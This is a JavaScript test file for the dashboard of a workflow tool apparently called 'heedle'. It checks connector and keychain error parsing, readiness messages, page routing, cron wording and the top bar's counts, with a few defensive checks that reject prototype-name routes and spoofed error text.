  assert.deepEqual(DD.connectorProblem("pirn: setup: the worker has no Anthropic API key: run `heedle secret set ANTHROPIC_API_KEY`, or set ANTHROPIC_API_KEY where it runs"), { key: "ANTHROPIC_API_KEY" });
  assert.deepEqual(DD.connectorProblem('connector "maps": can\'t read MAPS_KEY now: pirn: setup: keychain: the keyring holding MAPS_KEY is locked: unlock it (log in to the desktop, or run gnome-keyring-daemon --unlock in this session)'), { locked: true });
  assert.deepEqual(DD.connectorProblem("the worker can't read its Anthropic API key now: pirn: setup: keychain: security didn't answer in 15s: is it waiting for you to allow access in a window, or locked?"), { locked: true });
  assert.deepEqual(DD.connectorProblem('connector "maps": can\'t read MAPS_KEY now: pirn: setup: the keychain\'s MAPS_KEY isn\'t one line of printable ASCII (was it made outside heedle?): store it again with `heedle secret set MAPS_KEY`'), { connector: "maps", key: "MAPS_KEY", again: true });
  // review 31: other reasons a keychain couldn't be read aren't "locked";
  // a sentence inside other text (a tool's error) isn't pirn's.
  for (const other of ["exit status 1", "", null, askedFor("x", "x", "x"), needs("Bad Name", "X"),
    "the worker can't read its Anthropic API key now: pirn: setup: this system has no keychain heedle can use (macOS or Linux only)",
    needs("github", "EVIL_TOKEN") + " and then some", 'tool said: connector "github" needs EVIL_TOKEN: store it']) {
    assert.equal(DD.connectorProblem(other), null, String(other));
  }
});

test("a skill's connectors are connected only with every key (review 31)", () => {
  const v = (cs, error) => ({ file: "f", anthropic: { name: "ANTHROPIC_API_KEY", from: "keychain" }, connectors: cs, ...(error ? { error } : {}) });
  const maps = (from) => ({ name: "maps", secrets: [{ name: "HEEDLE_CONNECTOR_MAPS_TOKEN", from }] });
  const states = (g, view) => DD.skillConnectors(g, view).map((c) => c.name + ":" + c.state).join(" ");
  assert.equal(states("maps/directions search", v([maps("keychain")])), "maps:connected search:absent");
  assert.equal(states("maps", v([maps("missing")])), "maps:key");
  assert.equal(states("maps", v([maps("environment")])), "maps:connected");
  assert.equal(states("maps", v([], "connectors file: bad")), "maps:unknown");
  assert.equal(states("maps", null), "maps:unknown");
  assert.equal(states("", v([])), "");
});

test("a run with no record says which steps stopped it (review 32)", () => {
  const steps = [
    { node: "n0", status: "Completed", attempts: 2, failure: "carrier API: 503 (attempt 1)" },
    { node: "n1", status: "Failed", attempts: 1, failure: 'pirn: setup: the step asks for "maps", but this worker grants only "" of it (its connectors: "search")' },
    { node: "n2", status: "TimedOut", attempts: 3, failure: "activity StartToClose timeout" },
    { node: "n3", status: "Abandoned" },
    { node: "n4", status: "Failed" },
  ];
  assert.deepEqual(DD.stoppedBy(steps).map((s) => s.node), ["n1", "n2"]);
  assert.deepEqual(DD.connectorProblem(DD.stoppedBy(steps)[0].failure), { missing: ["maps"] });
  assert.deepEqual(DD.stoppedBy(null), []);
});

// review 32: SchedulesPage called useState after its early returns, so
// React threw (#310) as soon as the list loaded. Every component calls its
// hooks before any return, every render.
test("components call hooks before any early return (review 32)", () => {
  const src = require("fs").readFileSync(require("path").join(__dirname, "..", "static", "app.js"), "utf8");
  const bad = [];
  for (const chunk of src.split(/^function /m).slice(1)) {
    const name = chunk.slice(0, chunk.indexOf("("));
    const body = chunk.slice(0, chunk.search(/^}/m) + 1 || undefined).split("\n");
    const first = body.findIndex((l) => /^  (if \(.*\) )?return\b/.test(l));
    if (first < 0) continue;
    body.slice(first + 1).forEach((l, i) => {
      if (/^  (const|let) .*\buse(State|Effect|Ref|Memo|Callback|Reducer|Context|LayoutEffect)\(|^  use(Effect|LayoutEffect)\(/.test(l)) bad.push(`${name}: line ${first + 2 + i} of it`);
    });
  }
  assert.deepEqual(bad, []);
});

test("the front door reads proposals and says what's missing (roadmap 8.3)", () => {
  const plan = { nodes: [{ id: "n0", activity: "Skill", args: ["trip", "v", "Lisbon"] }] };
  const ready = { needs: [{ connector: "maps", problem: "absent" }, { connector: "mail", tools: ["send"], problem: "key", key: "MAIL_KEY" }, { connector: "search" }, { connector: "cal", problem: "unreadable", key: "CAL", detail: "locked" }], claude: "key", ready: false };
  const p = DD.asProposal({ summary: "I'll plan Lisbon.", program: "(trip \"Lisbon\")\n", plan, schedule: { every: 168 * 3600e9 }, name: "lisbon-weekly", ready, attempts: 1 });
  assert.equal(p.name, "lisbon-weekly");
  assert.equal(DD.goDuration(p.schedule.every), "168h");
  assert.equal(DD.goDuration(90 * 6e10), "90m");
  const lines = DD.readyLines(p.ready);
  assert.deepEqual(lines.map((l) => [l.what, l.ok, l.href]), [["Claude", false, "#/connectors"], ["maps", false, "#/connectors"], ["mail (send)", false, "#/connectors"], ["search", true, ""], ["cal", false, "#/connectors"]]);
  assert.match(lines[1].fix, /Add a connector named maps/);
  assert.match(lines[2].fix, /MAIL_KEY/);
  assert.deepEqual(DD.readyLines({ needs: [], error: "connectors file: bad", ready: false }).map((l) => l.ok), [false]);
  // Review 33: what a step could change, and an agent image, are said.
  const w = DD.readyLines(DD.asReadiness({ needs: [{ connector: "mail", writes: ["send"], approve: true }, { connector: "slack", writes: ["post"] }], agent: "no agent image", browser: "no browser image", ready: false }));
  assert.deepEqual(w.map((l) => [l.what, l.ok]), [["Agent steps", false], ["Browse steps", false], ["mail", true], ["slack", true]]);
  assert.match(w[2].writes, /send, each waiting for your approval/);
  assert.match(w[3].writes, /post, without asking you/);
  assert.equal(DD.asReadiness({ needs: [{ connector: "mail", writes: "send" }], ready: true }), null);
  assert.deepEqual(DD.readyLines(null), []);
  assert.ok(DD.asProposal({ summary: "Nothing books flights.", skill: "Books flights." }).skill);
  for (const bad of [
    null, {}, { summary: "" }, { summary: "s" }, { summary: "s", program: "(x)", skill: "y", plan },
    { summary: "s", program: "(x)" }, // no plan
    { summary: "s", skill: "y", schedule: { every: 1 }, name: "n" }, // schedule without a program
    { summary: "s", program: "(x)", plan, schedule: { every: 6e10, cron: "0 8 * * *" }, name: "n" },
    { summary: "s", program: "(x)", plan, schedule: { every: 6e10 }, name: "Bad Name" },
    { summary: "s", program: "(x)", plan, ready: { needs: [{ connector: "maps", problem: "gone" }], ready: true } },
    { summary: "s", program: "(x)", plan, ready: { needs: [{ connector: "<b>" }], ready: true } },
  ]) assert.equal(DD.asProposal(bad), null, JSON.stringify(bad));
  const conv = [{ request: "a", proposal: { summary: "A", program: "(a)" } }, { request: "oops", error: "x" }, { request: "b", proposal: { summary: "B", skill: "s" } }];
  assert.deepEqual(DD.earlierTurns(conv), [{ request: "a", summary: "A", program: "(a)" }, { request: "b", summary: "B", program: "" }]);
  assert.equal(DD.earlierTurns(Array.from({ length: 12 }, (_, i) => ({ request: String(i), proposal: { summary: "s" } }))).length, 10);
  assert.equal(DD.localDay(new Date(2026, 10, 4, 23, 30)), "2026-11-04");
  assert.equal(DD.asReadiness({ needs: [], ready: true }).ready, true);
  assert.equal(DD.asReadiness({ ready: "yes" }), null);
});

test("cron times read as words where they're simple", () => {
  assert.equal(DD.when({ cron: "0 8 * * 1", timeZone: "Europe/Lisbon" }), "every Monday at 8:00 (Europe/Lisbon)");
  assert.equal(DD.when({ cron: "30 7 * * 1-5" }), "every weekday at 7:30 (UTC)");
  assert.equal(DD.when({ cron: "5 18 * * *", timeZone: "Asia/Tokyo" }), "every day at 18:05 (Asia/Tokyo)");
  assert.equal(DD.when({ cron: "0 7 * * 0" }), "every Sunday at 7:00 (UTC)");
  for (const c of ["0 8 1 * *", "*/5 * * * *", "0 8 * * 1,3", "0 25 * * 1", "x"]) assert.match(DD.when({ cron: c }), /^at cron /, c);
});

test("the conversation survives a visit to the connectors page (review 34)", () => {
  const plan = { nodes: [{ id: "n0", activity: "Echo", args: [] }] };
  const kept = JSON.stringify([{ request: "a", proposal: { summary: "A", program: "(echo)", plan } }, { request: "b", error: "no" }, { request: "c", proposal: { summary: "" } }, null, { request: 5 }]);
  assert.deepEqual(DD.restoreConversation(kept).map((t) => t.request), ["a", "b"]);
  assert.deepEqual(DD.restoreConversation("not json"), []);
  assert.deepEqual(DD.restoreConversation(null), []);
  assert.equal(DD.restoreConversation(JSON.stringify(Array.from({ length: 14 }, (_, i) => ({ request: String(i), error: "e" })))).length, 10);
});

test("every route the app shows is one page in one section (DRAW-68)", () => {
  // App picks what to show by DD.page's name, so the names its switch
  // handles must be exactly PAGES' names, and every page is in a section.
  const app = require("node:fs").readFileSync(require("node:path").join(__dirname, "..", "static", "app.js"), "utf8");
  const sw = /switch \(pg\.name\) \{([\s\S]*?)\n  \}/.exec(app);
  assert.ok(sw, "App chooses its page with switch (pg.name)");
  const cases = [...sw[1].matchAll(/case "([a-z]+)":/g)].map((m) => m[1]).sort();
  assert.deepEqual(cases, Object.keys(DD.PAGES).sort());
  assert.match(sw[1], /default: body = html`<\$\{Home\} /);
  // Review 37: the header still chose the agent pill from route[0], so
  // #/agent blanked the page and #/agent/x/extra mixed two pages.
  assert.ok(!/route\[0\]/.test(app), "nothing chooses by route[0] outside DD.page");
  for (const [name, p] of Object.entries(DD.PAGES)) assert.ok(DD.SECTIONS.includes(p.section), name);
  const cases2 = {
    "": "runs", "agent/refs/loom/main": "runs", "run/w/r": "runs", "step/w/r/n0": "runs", "diff/a/b": "runs",
    skills: "skills", "skill/pdf": "skills", "skill/pdf/abc": "skills", "review/pdf": "skills",
    schedules: "schedules", connectors: "connectors",
  };
  for (const [hash, section] of Object.entries(cases2)) assert.equal(DD.page(hash.split("/")).section, section, hash);
  assert.deepEqual(DD.page(["agent", "refs/loom/main"]), { name: "agent", section: "runs" });
  assert.deepEqual(DD.page(["review", "pdf"]), { name: "review", section: "skills" });
  // Anything no page takes is the home page: wrong lengths, unknown names,
  // and names that only an object's prototype has.
  for (const r of [[""], ["run", "w"], ["skills", "x"], ["skill"], ["skill", "a", "b", "c"], ["nowhere"], ["constructor"], ["__proto__"],
    ["toString"], ["hasOwnProperty", "x"], [], null, undefined, "skills", [7], [["skills"]]]) {
    assert.deepEqual(DD.page(r), { name: "home", section: "runs" }, JSON.stringify(r));
  }
});

test("the top bar counts only from answers it understands (DRAW-69)", () => {
  const H = (c) => c.repeat(40);
  const ok = (data) => ({ ok: true, status: 200, data });
  const waiting = { name: "pdf", description: "d", version: H("a"), commit: H("b"), pending: true };
  assert.equal(DD.skillsWaiting(ok({ skills: [], pending: [waiting, { ...waiting, name: "two" }], problems: [] })), 2);
  assert.equal(DD.skillsWaiting(ok({ skills: [], problems: [] })), 0, "a server with no skills store sends no pending");
  // A malformed entry, or one not marked pending, isn't counted, as the
  // Skills page doesn't list it.
  assert.equal(DD.skillsWaiting(ok({ skills: [], pending: [waiting, { ...waiting, version: "x" }, { ...waiting, pending: false }, null, 7] })), 1);

  const key = (name, from) => ({ name, from });
  const conn = (secrets) => ({ name: "maps", url: "https://m.example/mcp", tools: [], writes: [], secrets });
  const frame = (anthropic, connectors) => ok({ file: "/c.json", keychain: true, anthropic, connectors });
  assert.equal(DD.keysToSet(frame(key("ANTHROPIC_API_KEY", "missing"), [conn([key("MAPS_KEY", "missing"), key("HEEDLE_CONNECTOR_MAPS_TOKEN", "missing")])])), 3);
  assert.equal(DD.keysToSet(frame(key("ANTHROPIC_API_KEY", "keychain"), [conn([key("MAPS_KEY", "environment")])])), 0);
  // A signed-in connector keeps its token as a key: counted once the
  // token is gone, not while it's there, even if the sign-in has expired
  // (review 37: the wiki said any sign-in to do again counted).
  const signed = (from) => ({ ...conn([key("HEEDLE_CONNECTOR_MAPS_TOKEN", from)]), signedIn: from !== "missing" });
  assert.equal(DD.keysToSet(frame(key("ANTHROPIC_API_KEY", "keychain"), [signed("keychain")])), 0);
  assert.equal(DD.keysToSet(frame(key("ANTHROPIC_API_KEY", "keychain"), [signed("missing")])), 1);
  // One unreadable connector is left out, as on the Connectors page.
  assert.equal(DD.keysToSet(frame(key("ANTHROPIC_API_KEY", "keychain"), [conn([key("MAPS_KEY", "missing")]), { name: "bad", secrets: "x" }])), 1);

  const sched = (name, paused, note) => ({ name, program: "(echo)", ref: "refs/loom/main", spec: { every: 6e10 }, paused, note, next: [], recent: [] });
  // Temporal's notes for a pause after a failed or timed-out run, from
  // both its schedulers; heedle's pause and Temporal's others aren't.
  const all = [
    sched("a", true, "paused due to workflow failure: sched-a-2026: activity error"),
    sched("b", true, "paused due to workflow timeout: sched-b-2026"),
    sched("c", true, "paused, workflow failed: sched-c-2026"),
    sched("d", true, "paused, workflow timedout: sched-d-2026"),
    sched("e", true, "paused from heedle"),
    sched("f", true, "paused for migration to workflow-backed scheduler"),
    sched("g", false, "paused due to workflow failure: resumed since"),
    sched("h", true, "the run paused due to workflow failure: x"),
    sched("i", true, undefined),
  ];
  assert.equal(DD.schedulesStopped(ok({ schedules: all })), 4);
  assert.equal(DD.schedulesStopped(ok({ schedules: [] })), 0);
  assert.equal(DD.schedulesStopped(ok({ schedules: [{ ...all[0], name: "Bad Name" }, all[1]] })), 1, "a malformed schedule isn't counted");

  // Failed, malformed or missing answers give no count at all.
  for (const bad of [undefined, null, {}, { ok: false, status: 500, data: { error: "x" } }, { ok: false, status: 0, data: { error: "offline" } },
    ok(null), ok("text"), ok([]), ok(7), { ok: "yes", data: { skills: [], pending: [] } }]) {
    assert.equal(DD.skillsWaiting(bad), null, JSON.stringify(bad));
    assert.equal(DD.keysToSet(bad), null, JSON.stringify(bad));
    assert.equal(DD.schedulesStopped(bad), null, JSON.stringify(bad));
  }
  assert.equal(DD.skillsWaiting(ok({ pending: [waiting] })), null, "no skills list");
  assert.equal(DD.skillsWaiting(ok({ skills: [], pending: "x" })), null);
  assert.equal(DD.keysToSet(ok({ file: "/c.json", connectors: [] })), null, "no Claude key");
  assert.equal(DD.keysToSet(ok({ file: "/c.json", anthropic: key("ANTHROPIC_API_KEY", "missing"), connectors: "x" })), null);
  assert.equal(DD.schedulesStopped(ok({ schedules: "not a list" })), null);
  assert.equal(DD.schedulesStopped(ok({})), null);
});

test("the page's keyboard shortcuts never fire while typing in the program editor", () => {
  // Roadmap 9.4: the editor is contenteditable (CodeMirror), so "+" typed
  // into a program zoomed the graph while the check named only inputs and
  // textareas.
  const app = require("node:fs").readFileSync(require("node:path").join(__dirname, "../static/app.js"), "utf8");
  const checks = app.match(/closest\("[^"]*textarea[^"]*"\)/g) || [];
  assert.ok(checks.length >= 2);
  for (const c of checks) assert.match(c, /\[contenteditable\]/, c);
});
